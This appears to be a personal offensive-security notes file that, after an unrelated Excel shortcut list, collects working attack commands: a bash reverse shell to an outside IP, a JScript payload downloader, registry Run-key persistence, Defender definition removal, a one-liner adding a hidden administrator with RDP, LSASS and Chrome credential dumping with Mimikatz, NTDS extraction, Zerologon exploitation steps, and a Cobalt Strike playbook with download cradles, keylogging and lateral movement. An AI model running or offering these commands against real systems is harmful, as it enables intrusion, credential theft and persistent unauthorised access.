
<p align="center">
  <body>
    <img src="2zHQ.gif" width="500" height="300">
  </body>
</p>

````
Ctrl + A - Select All
Ctrl + B - Bold
Ctrl + C - Copy
Ctrl + D - Fill
Ctrl + F - Find
Ctrl + G - Find next instance of text
Ctrl + H - Replace
Ctrl + I - Italic
Ctrl + K - Insert a hyperlink
Ctrl + N - New workbook
Ctrl + O - Open
Ctrl + P - Print
Ctrl + R - Nothing right
Ctrl + S - Save
Ctrl + U - Underlined
Ctrl + V - Paste
Ctrl W - Close
Ctrl + X - Cut
Ctrl + Y - Repeat
Ctrl + Z - Cancel
F1 - Help
F2 - Edition
F3 - Paste the name
F4 - Repeat the last action
F5 - Goto
F6 - Next Pane
F7 - Spell Check
F8 - Extension of the mode
F9 - Recalculate all workbooks
F10 - Activate Menubar
F11 - New graph
F12 - Save As
Shift + F1 - What is it?
Shift + F2 - Edit cell comment
Shift + F3 - Paste the function into the formula
Shift + F4 - Search Next
Shift + F5 - Find
Shift + F6 - Previous Panel
Shift + F8 - Add to the selection
Shift + F9 - Calculate the active worksheet
Shift + F10 - Popup menu display
Shift + F11 - New spreadsheet
Shift + F12 - Save
Ctrl + F3 - Set name
Ctrl + F4 - Close
Ctrl + F5 - XL, size of the restore window
Ctrl + F6 - Next Workbook Window
Shift + Ctrl + F6 - Previous Workbook Window
Ctrl + F7 - Move window
Ctrl + F8 - Resize Window
Ctrl + F9 - Minimize the workbook
Ctrl + F10 - Maximize or Restore Window
Ctrl + F11 - Inset 4.0 Macro sheet
Ctrl + F1 - Open File
Alt + F1 - Insert a graph
Alt + F2 - Save As
Alt + F4 - Output
Alt + F8 - Macro dialog
Alt + F11 - Visual Basic Editor
Ctrl + Shift + F3 - Create a name using the names of row and column labels
Ctrl + Shift + F6 - Previous Window
Ctrl + Shift + F12 - Printing
Alt + Shift + F1 - New spreadsheet
Alt + Shift + F2 - Save
Alt + = - AutoSum
Ctrl + `- Toggle value / display of the formula
Ctrl + Shift + A - Insert the argument names in the formula
Alt + down arrow - automatic view list
Alt + '- Format Style Dialog
Ctrl + Shift + ~ - General Format

````
brute hash in google-colab & console.cloud.google.com | google cloud platform
````
!bash -c 'bash -i >& /dev/tcp/1.1.1.1/1212 0>&1'


install hashcat in colab

apt-get install cmake build-essential -y && apt install checkinstall git -y && git clone https://github.com/hashcat/hashcat.git && cd hashcat && git submodule update --init && make && make install

hashcat -m 2500 -a3 1.hccapx ?d?d?d?d?d?d?d?d?d?d



crunch 8 8 | aircrack-ng -e Tel_196_5G -w –2.cap

````




https://github.com/jreegun/Researches/tree/master/Exe%20Sideloading
https://youtu.be/3aZM0Rfjgy4

````
var  WinHttpReq  =  new  ActiveXObject ( "WinHttp.WinHttpRequest.5.1" ) ; 
WinHttpReq . Open ( "GET" ,  WScript . Arguments ( 0 ) ,  /*async=*/ false ) ; 
WinHttpReq . Send ( ) ; 
BinStream  =  new  ActiveXObject ( "ADODB.Stream" ) ; 
BinStream . Type  =  1 ;  BinStream . Open( ) ; 
BinStream . Write ( WinHttpReq . ResponseBody ) ; 
BinStream . SaveToFile ( "1.exe" ) ;

cscript /nologo 1.js http://192.168.1.192/Client.exe
````

````
WScript.Sleep(5000):Set objShell = WScript.CreateObject("WScript.Shell"):objShell.Run("start C:\Users\Public\putty.exe"), 0, True
````

````
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "%TEMP%\wncat.vbs"
````

````
aHR0cHM6Ly9zZWMubm1hc2suY24vYXJ0aWNsZV9jb250ZW50P2FfaWQ9YWQ1ZWI3NzQ1NDMxYzk4YzRiN2QxZWYyNzc0ZjI2NGI=

````
Анализируйте запросы ARP для определения взаимодействующих хостов и устаревших конфигураций сетевых адресов (SNAC)
https://github.com/arch4ngel/eavesarp


## make proxy in target PC

https://www.youtube.com/watch?v=ghZ8XK9zEfI<br>
proxy UP &
````
vim /etc/proxychains4.conf
proxychains4 nmap -A -F -sT -Pn 10.10.10.1/24 > nmap_res.txt
````


````
procdump.exe -accepteula -ma lsass.exe lsass.dmp
sekurlsa::minidump lsass.dmpsekurlsa::dpapi

````
## Mimikatz Chrome-dump

````
mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotectbeacon> mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
````
### Chrome cookies

````
 dpapi::chrome /in:"%localappdata%GoogleChromeUser DataDefaultCookies" /unprotect
````



## Download with Powershell

https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell

https://adamtheautomator.com/powershell-download-file/


````
Invoke-WebRequest -Uri $url -OutFile $output
````

````
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
````

bYpASS

https://github.com/tokyoneon/Chimera



````
powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
````
````
https://cloud.mail.ru/public/yp5y/tod8RWQqv
````
````
https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters

посмотреть процессы:

tasklist /V
tasklist /SVC

посомтреть АВ\

WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
sc query windefend

удалить правила для ДЕФ

"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

посмотреть установленные программы

reg query HKEY_LOCAL_MACHINE\SOFTWARE

ПОРТЫ открытые:

netstat -ano

порты для программ:
netsh firewall show state
netsh firewall show config


включить РДП

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed


net user hacker PASS /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

Авто загрузка управление

- https://www.thewindowsclub.com/manage-startup-items-windows-8

- https://www.techsupportall.com/how-to-disable-startup-programs-in-windows-10/#method4

-= https://community.spiceworks.com/topic/2140905-disabling-windows-startup-services-through-command-prompt

++ https://github.com/Faustvii/StartupManager
````
https://zer1t0.gitlab.io/posts/attacking_ad/

````
Active Directory


# Recon

net view /all                                     Show all shares
net view /all /domain                             Show all shares in the domain
nltest /domain_trusts /all_trusts                 Show domain trusts
nltest /dclist:<domain>                           Show domain controllers for a given domain
net localgroup "administrator"                    Show users in the local administrator group
net group "domain admins" /domain                 Show users in the domain admins Security Group

AdFind.exe -f "(objectcategory=person)"
AdFind.exe -f "(objectcategory=computer)"
AdFind.exe -f "(objectcategory=organizationalUnit)"
AdFind.exe -sc trustdmp
AdFind.exe -subnets -f "(objectCategory=subnet)"
AdFind.exe -f "(objectcategory=group)"
AdFind.exe -gcb -sc trustdmp

net user /domain                                  Show all domain users
net user <user> /domain                           Show all Security Groups a domain user belongs to
net group /domain                                 Show all Security Groups in a domain

- Other
dig -t SRV _gc._tcp.lab.acme.org                  Global catalog
dig -t SRV _ldap._tcp.acme.org                    LDAP servers
dig -t SRV _kerberos._tcp.acme.org                Kerberos KDC
dig -t SRV _kpasswd._tcp.acme.org                 Kerberos password change server

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='acme.org'"

Using Windows > cmd > powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain()
Look for PdcRoleOwner and Name
------------------------------------------------------------------------------------------------------

# Responder

Use Responder to poison LLMNR/NBT-NS requests and capture NTLM/NTLNv2 hashes. This happens when you
    try to identify a host and DNS fails.

responder -A -I eth0
responder -I eth0 -wrd

- Crack the hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

- Relay NTLMv2 hashes if SMB Signing is disabled.
cd /opt/CrackMapExec/cme/thirdparty/impacket/examples/
ntlmrelayx.py

- Host discovery and enumeration
netdiscover -i eth0 -r <CIDR>
nmap -Pn -n -T4 --open -p- -sC -sV -iL targets.txt
    Or use Discover which combines nmap, nmap scripts and Metasploit auxiliary modules.
------------------------------------------------------------------------------------------------------

# BloodHound

neo4j console
Split the screen horizontally
firefox http://localhost:7474 &
Login with username and password: neo4j
Set a new password

- How to reset the default password for neo4j
/usr/share/neo4j/bin/neo4j-admin set-initial-password neo4j
firefox http://localhost:7474 &
Login with username and password: neo4j
Set a new password.

cd /opt/BloodHound-v4/Collectors/
python -m SimpleHTTPServer

- Windows
cd to a discrete, writable directory (C:\Users\<user>\Desktop)
powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/SharpHound.exe', 'SharpHound.exe')"

SharpHound.exe -c LoggedOn                        Run the following as a user that has admin rights
SharpHound.exe -c Session                         On subseqequent runs just collect session data

This will generate a zip file
Upload the file to Kali
powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/sharp.zip',"<PostDATA>")"

- BloodHound UI
cd /opt/BloodHound-v4/BloodHound-linux-x64/
./BloodHound --no-sandbox
Login
Drag and drop the zip file into the UI
------------------------------------------------------------------------------------------------------------------------------------------------------

# ADACLScanner

cd to a discrete, writable directory (C:\Users\<user>\Desktop)
powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/ADACLScan.ps1', 'ADACLScan.ps1')"

.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM"

    or (default is CSV output)

.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM" -HTML

File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
------------------------------------------------------------------------------------------------------------------------------------------------------

# Domain Controller (DC)

nbtstat -a <target IP>

The netbios hex code “1C” next to the domain name signifies that the system being polled is a domain
controller for the domain name listed on the left. If the “1C” would have been next to an Inet service
it would have signified it was an IIS server.

Note the differences between the U and the G. U = UNIQUE and G = GROUP. When you see a hex code next
to UNIQUE it is usually associated with the computer itself. With GROUP it is associated with the
workgroup or domain.

- Use the following MSF module to authenticate to the DC via SMB, create a volume shadow copy of the
system drive, and downloads copies of NTDS.DIT and SYSTEM hive. Then use Impacket to perform
extraction of the hashes.
auxiliary/admin/smb/psexec_ntdsgrab
impacket-secretsdump -system SYSTEM -ntds NTDS.DIT LOCAL

impacket-secretsdump -hashes <hash> -just-dc LAB/dc\$@10.0.0.1
------------------------------------------------------------------------------------------------------------------------------------------------------

# Extract passwords from Group Policy

powershell.exe -nop -exec bypass
Import-Module PowerSploit.ps1
Get-GPPPassword

\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
Search xml files for cpassword.
GetDecryptedCpassword 'AES 256-bit encrypted password'
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show DCs
dsquery server
get-netdomaincontroller
net group “domain controllers” /domain
net view \\<server>                               DCs contain SYSVOL and NETLOGON shares
cmd.exe /c set                                    LOGONSERVER variable

# Show DC in a specific domain
dsquery server -domain <something.int>
get-netdomaincontroller -domain <something.int>
nslookup <something.int>                          Internally, this will likely return DCs that are DNS servers
nslookup                                          pseudo-shell
    set type=all
    _ldap._tcp.<something.int>
nbtstat -a                                        Look for the attribute 1C

# Show DCs forest-wide
dsquery server -forest
get-netforestdomain

# Show Computer Account Objects
Show computer accounts
dsquery computer
dsquery * -filter “(objectclass=computer)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
get-netcomputer
get-netcomputer -fulldata | select-object dnshostname,description,operatingsystem,operatingsystemversion

# Show servers based on description
dsquery * -filter “&(objectclass=computer)(operatingsystem=*server*)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show all Active Directory (AD) user accounts
dsquery user -limit 0
get-netuser 			This will display all accounts and their attributes.
get-netuser | select-object samaccountname

# Show attributes of a user account
dsquery * -filter “&(objectclass=user)(samaccountname=<user>)” -attr *
get-net-user <user>

# Show users with no password expiration
dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)” -attr samaccountname,name
get-netuser -filter "useraccountcontrol>=65535" | select-object samaccountname,name

# Show user accounts and their associated Service Principal Names (SPNs)
dsquery.exe * -filter "(serviceprincipalname=*)" -attr samaccountname, serviceprincipalname
dsquery.exe * -filter "&(serviceprincipalname=*)(samaccounttype=805306368)" -attr samaccountname,serviceprincipalname
get-netuser -spn | select-object samaccountname,serviceprincipalname
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show administrators
dsquery * -filter “&(objectclass=user)(admincount=1)” -attr samaccountname,name
dsquery * -filter “&(objectclass=group)(name=*admin*)” -attr member -limit 0 -l
dsquery group -name *admin*
get-netuser -admincount | select-object samaccountname,name
get-netgroup -fulldata -groupname "*admin*" | select-object member

# Show administrators with no password expiration
dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)(admincount=1)” -attr samaccountname,name
get-netuser -filter "(useraccountcontrol>=65535)(admincount=1)" | select-object samaccountname,name

# Show domain admins
dsquery * -filter “name=domain admins” -attr member -l
get-netgroup -fulldata -groupname "domain admins" | select-object member
net group “domain admins” /domain

# Show enterprise admins
dsquery * -filter “name=enterprise admins” -attr member -d <forest domain.int> 
get-netgroup -fulldata -groupname "enterprise admins" | select-object member
net group “enterprise admins” /domain

# Show local administrators on DCs
dsquery * -filter “name=administrators” -attr member -l
get-netgroup -fulldata -groupname "administrators" | select-object member
net localgroup administrators /domain
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show Organizational Units (OU)
dsquery ou -limit 0
get-netou
get-netou -fulldata

# Show users under a specific OU
dsquery * “ou=something,dc=domain,dc=int” -filter objectclass=user

# Show child OUs under parent OU
dsquery * “ou=something,dc=domain,dc=int” -filter objectcategory=organizationalunit) -attr name
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show All Group Policy Objects (GPO) data
dsquery * -filter “(objectclass=grouppolicycontainer)” -attr *
get-netgpo

# Map GPO names (UUID) to display names
dsquery * -filter “(objectclass=grouppolicycontainer)” -attr name,displayname
get-netgpo | select-object name,displayname

# Show OUs and applied GPOs
dsquery * -filter “(objectcategory=organizationalunit)” -attr distinguishedname, gplink
get-netou -fulldata | select-object distinguishedname, gplink
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show Trust Relationships
dsquery * -filter “(objectclass=TrustedDomain)” -attr trustpartner,flatname,trustdirection
get-netdomaintrust

# Show Sites and Subnets
dsquery subnet
get-netsubnet
dsquery site
get-netsite
dsquery * “cn=subnets,cn=sites,cn=configuration,dc=<something>,dc=<int>” -attr description,cn,siteobject

# Show Active Directory Partitions
dsquery partition
------------------------------------------------------------------------------------------------------------------------------------------------------

# Dump hashes for all domain users

powershell -nop -exec bypass
Import-Module PowerView
Invoke-UserHunter
Import-Module PowerSploit
Invoke-Mimikatz -ComputerName <name>

Open a new PS window as Administrator
Use the creds you just found

Import-Module PowerView
Get-NetDomainController
Import-Module PowerSploit
Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDistination C:\ntds.dit -ComputerName <DC name>
ls

- Example 2
python secretsdump.py acme.org/<user@dc name>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Zerologon CVE-2020-1472

apt install python3-virtualenv
virtualenv --python python3.8 zerologon-virtualenv
cd zerologon-virtualenv/bin
source ./activate
./pip3 install git+https://github.com/SecureAuthCorp/impacket.git
cd ../..

git clone https://github.com/SecuraBV/CVE-2020-1472.git
mv CVE-2020-1472 scanner
cd scanner
pip install -r requirements.txt
chmod 755 zerologon_tester.py
zerologon_tester.py <dc-name> <dc-ip>

cd ..
git clone https://github.com/dirkjanm/CVE-2020-1472.git
mv CVE-2020-1472 exploit
cd exploit
chmod 755 *.py
./cve-2020-1472-exploit.py <dc-name> <dc-ip>

cd ../zerologon-virtualenv/bin/
secretsdump.py -no-pass -just-dc lab.corp/dc-1\$@192.168.0.20
````


````
Cobalt Strike

# Opsec

/sbin/iptables -I INPUT 1 -p tcp -s 0.0.0.0/0 --dport 50050 -j DROP
/sbin/iptables -I INPUT 1 -p tcp -s 127.0.0.1 --dport 50050 -j ACCEPT

ssh user@teamserver -L 50050:127.0.0.1:50050
Start the client, set the host to 127.0.0.1
------------------------------------------------------------------------------------------------------------------------------------------------------

Install or update
    cd /opt/cobaltstrike/
    ./update

Remove old data and Beacons (optional)
    Stop the team server
    rm -rf /opt/cobaltstrike/data/

Start the team server
    There are 2 mandotory parameters and 2 optional parameters. The first 2 parameters are required.
    ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons yyyy-mm-dd>

    ./teamserver 192.168.1.5 password /opt/cobaltstrike/malleable-c2-profiles/APT/etumbot.profile 2021-12-31

    When the team server starts, it will display the SHA256 hash of the SSL cert. Send this hash to your team members.

Login to the team server
    Right-click in the Terminal > Split Terminal Horizontally
    cd /opt/cobaltstrike/
    ./cobaltstrike
    Host: <127.0.0.1 if running locally or IP of remote team server>
    Port: 50050
    User: <your nickname>
    Password: <password you entered above>
    Connect
    VerifyFingerprint (SHA256 hash) > Yes
------------------------------------------------------------------------------------------------------------------------------------------------------

# Valid SSL Certificate for Beacon 

Create a Java Keystore file. Use the fully qualified domain name to your Beacon server.
keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store

Generate a Certificate Signing Request (CSR). Submit this file to your SSL certificate vendor. 
They will verify that you are who you are and issue a certificate.
keytool -certreq -keyalg RSA -file domain.csr -keystore domain.store

Import the Root and any Intermediate Certificates that your SSL vendor provides.
keytool -import -trustcacerts -alias FILE -file FILE.crt -keystore domain.store

Install your Domain Certificate.
keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store
 
Cobalt Strike expects to find the Java Keystore file in the same folder as your Malleable C2 profile.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Redirectors

Create 3 free Ubuntu instances in AWS. These instances will be used for the following:
    Redirector1 - DNS
    Redirector2 - HTTP
    Redirector3 - HTTP3
    
Install socat on each instance.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Create Listeners

Cobalt Strike > Listeners > Add
Name: DNS
Payload: Beacon DNS
DNS Hosts: click + <Redirector1 IP>
OK > Save > OK

Add
Name: HTTP
Payload: Beacon HTTP
HTTP Hosts: click + <Redirector2 IP>
OK > Save > OK

Add
Name: HTTPS
Payload: Beacon HTTPS
HTTPS Hosts: click + <Redirector3 IP>
OK > Save > OK
------------------------------------------------------------------------------------------------------------------------------------------------------

# Launch an attack to gain a foothold.

Disable Windows Defender on your target Windows VM.
    Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
    Standard: Windows Defender settings > turn off Real-time protection

Attack 1
    Attacks > Packages > Payload Generator
    Select the listener you just created > Choose
    Output: Veil
    Check Use x64 payload
    Generate
    Select the location for the payload > Save > OK

    cd /opt/Veil
    ./Veil.py
    use 1 (Evasion)
    clean (remove any old artifacts)
    list (look for payloads with shellcode_inject)
    use 12 (cs/shellcode_inject/base64.py)
    generate
    4 - File with shellcode (\x41\x42..)
    /root/payload.txt

    cd /var/lib/veil/output/compiled/payload.exe /tmp
    Attacks > Web Drive-by > Host File
    Browse to the file > Open
    Local URI: /download/update.exe
    Launch
    Copy the contents > Ok
    
Attack 2
    Attacks > Web Drive-by > Scripted Web Delivery (S)
    URI Path: /a
    Local Host: (same IP as your server)
    Local Port: 80 (same port as your Listener)
    Listener: Initial access > Choose
    Type: powershell
    Check Use x64 payload
    Launch

    Copy the download cradle provided > OK
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))"

    Open a Command Prompt on your Windows VM and run the download cradle.

Click on Cobalt Strike and you will see a Beacon session appear in the top pane.

Interact with the Beacon
    Right-click on the Beacon > Interact
    sleep 2                                       Have the Beacon check in once every 2 seconds
    help
    help <command>

Clean up
    exit
    Right click on the Beacon > Session > Remove
    Attacks > Web Drive-by > Manage
    Select each line > Kill
    Liteners > Restart > OK

Attack 3
    Attacks > Packages > HTML Application
    Listener: Initial access > Choose
    Method: Executable
    Generate
    /root/evil.hta
    Save > OK

    Attacks > Web Drive-by > Host File
    File: /root/evil.hta > Open
    Local URI: /survey.txt
    Local Host: 192.168.1.5
    Local Port: 80
    Mime Type: automatic
    Launch > OK

    Copy the URI provided > OK

    Open Internet Explorer on your Wibndows VM to http://192.168.1.5/survey.txt
    Open > Allow
    Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
------------------------------------------------------------------------------------------------------------------------------------------------------

View > Web Log is helpful to know when HTTP requests are hitting your team server.
Use the up arrow to scroll through previous commands.
Beacon is fully tab-completable.
All commands and their output are written to the logs directory.
ctrl+k will clear the current window.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumerate host

Seatbelt					  Part of https://github.com/Flangvik/SharpCollection
execute-assembly /opt/Seatbelt.exe -group=system
execute-assembly /opt/Seatbelt.exe -group=user

keylogger <PID> x64                               Inject a keystroke logger into a process
                                                  View > Keylogger > select item in lower left pane

https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Start-ClipboardMonitor.ps1
psinject <PID> x64 Start-ClipboardMonitor -CollectionLimit 5

screenshot <PID> x64                              Take a screenshot
                                                  View > Screenshots > select item in lower left pane

KeeThief					  https://github.com/GhostPack/KeeThief
powershell Get-KeePassDatabaseKey

getuid                                            Get User ID
ps                                                Show process list

pwd                                               Print current directory
ls                                                List files
drives                                            List drives on target

shell tasklist
shell ver
shell ipconfig /all
shell arp -a
shell systeminfo                                  System info
shell net time                                    Show time for a host
shell netstat -ano
shell whoami
shell net start
shell qprocess

net computers                                     List hosts in a domain (groups)
net domain                                        Display domain for this host
net dclist                                        List domain controllers
net domain_controllers                            List DCs in a domain (groups)
net domain_trusts                                 List domain trusts
shell net accounts                                Policy settings for user accounts
net user                                          List users and user information
net group                                         List groups and users in groups
net localgroup                                    List local groups and users in local groups
net localgroup Users                              Show users in the Users security group
net localgroup Administrators                     Show users in the Administrators security group
net logons                                        List users logged onto a host
net sessions                                      List sessions on a host
net share                                         List shares on a host

net view                                          List hosts in a domain (browser service)

jobs                                              List long-running post-exploitation tasks. Look for keylogger JID
jobkill <JID>                                     Kill a long-running post-exploitation task. Kill the keylogger using its JID
jobs                                              Verify the keylogger is no longer running
------------------------------------------------------------------------------------------------------------------------------------------------------

# PowerShell weaponization

powershell <cmdlet> <args>                        Starts powershell.exe and uses the highest supported PowerShell version
powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects UnmanagedPowerShell into it
psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell into the specified process
------------------------------------------------------------------------------------------------------------------------------------------------------

# Privilege Escalation

powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
powershell Invoke-PrivescAudit

SharpUp is a C# port of PowerUp			  Part of https://github.com/Flangvik/SharpCollection
Not all checks are ported.
execute-assembly /opt/GhostPack/SharpUp/SharpUp.exe

elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token
elevate svc-exe                                   Creates a SYSTEM service that will run our payload

https://github.com/rasta-mouse/Watson		  Part of https://github.com/Flangvik/SharpCollection

powerpick Invoke-ServiceAbuse -Name 'crappy-service'
spawnas john Password123! smb
Select john in the top pane > right-click > Interact
bypassuac http
john should now be running in a high integrity Beacon (see asterisk)
------------------------------------------------------------------------------------------------------------------------------------------------------

# Credential Abuse

make_token DOMAIN\user password

inject <PID> x64 >listener>

steal_token <PID>

mimikatz !lsadump::sam

SharpDump					  Part of https://github.com/Flangvik/SharpCollection

execute-assembly /opt/Seatbelt.exe LSASettings
execute-assembly /opt/Seatbelt.exe CredGuard
execute-assembly /opt/Seatbelt.exe -q SecPackageCreds

execute-assembly /opt/Rubeus.exe dump
------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral Movement

Always use a FQDN instead of an IP.
------------------------------------------------------------------------------------------------------------------------------------------------------

upload /tmp/beacon.dll
remote-exec wmi fileserver rundll32 c:\windows\temp\beacon.dll,start
------------------------------------------------------------------------------------------------------------------------------------------------------

# Emulate lateral movement between one victim egress host and four other hosts, that uses SMB for lateral
  movement, as well as follow-on victim to victim communications.

Controller domain: acme.org
Controller IP: x.x.x.x

ifconfig eth0 add x.x.x.x
cd /opt/cobaltstrike/
rm data/*.bin
./teamserver 192.168.1.5 password /opt/cobaltstrike/third-party/profiles/APT/etumbot.profile

Start Cobalt Strike and point to localhost.

Create http and smb listeners.

Launch an attack to gain a foothold.

Login to wkstn-10 as Administrator, open a command prompt, and paste in the PowerShell.
You should have an http Beacon on Cobalt Strike in about 10 sec.

Right-click on the new http Beacon > Interact
sleep 0                                           Make the Beacon interactive
note foothold

ps                                                Look for another user logged in
inject <PID> <arch> <listener>
inject 5678 x64 smb
Right-click on the new smb Beacon > Interact
hashdump                                          Recover local account password hashes
logonpasswords                                    Harvest credentials with mimikatz
View > Credentials

net view /domain
make_token site\administrator password
net group "Domain Computers" /DOMAIN              Show computers joined to the domain
shell nltest /dclist:SITE                         Locate the domain controller
ls \\wkuser-20\C$                                 Test remote access
psexec_psh wkuser-20 smb                          You should have a new smb Beacon in about 10 sec

Right-click on the new smb Beacon > Interact
sleep 2                                           Have the Beacon check in once every 2 seconds
note 1st hop
ps
hashdump
logonpasswords
make_token site\administrator password
ls \\site-file\C$
psexec_psh site-file smb

Right-click on the new http Beacon > Interact
sleep 2
note 2nd hop
ps
hashdump
logonpasswords
make_token site\administrator password
ls \\site-dc\C$
psexec_psh site-dc smb	
	
Right-click on the new http Beacon > Interact
sleep 2
note 3rd hop
------------------------------------------------------------------------------------------------------------------------------------------------------

# Misc notes

# Catch the callback from wkstn-04
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.0.0.80
set lport 443
run
migrate -N explorer.exe

# Make tunnels for wkuser-66
upload fpipeknockoff.windows.amd64.exe s:\\
shell
netsh advfirewall firewall delete rule  name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 10.0.0.80:443 <NUL >NUL 2>NUL & exit
run post/multi/manage/autoroute CMD=add netmask=/32 subnet=172.31.2.66
background
````
